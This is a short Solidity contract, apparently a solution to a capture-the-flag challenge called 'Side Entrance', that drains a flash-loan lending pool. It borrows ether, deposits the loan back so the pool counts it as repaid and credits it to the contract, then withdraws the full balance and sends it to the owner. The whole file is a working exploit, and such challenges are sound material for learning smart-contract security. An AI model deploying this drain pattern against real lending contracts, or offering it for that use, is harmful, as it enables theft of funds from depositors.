// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "./SideEntranceLenderPool.sol";


contract Yoink is IFlashLoanEtherReceiver {

    address private pool;
    address private owner;

    constructor (address _pool, address _owner) {
        pool = _pool;
        owner = _owner;
    }

    function exploit(uint256 amount) external {

        if(msg.sender != owner) {
            revert();
        }

        SideEntranceLenderPool(pool).flashLoan(amount);
        yoink();
    }

    function execute() external payable {
        
        SideEntranceLenderPool(pool).deposit{value:msg.value}();
    }

    function yoink() internal {

        SideEntranceLenderPool(pool).withdraw();
        SafeTransferLib.safeTransferETH(owner, address(this).balance);
    }

    receive() external payable {}
}
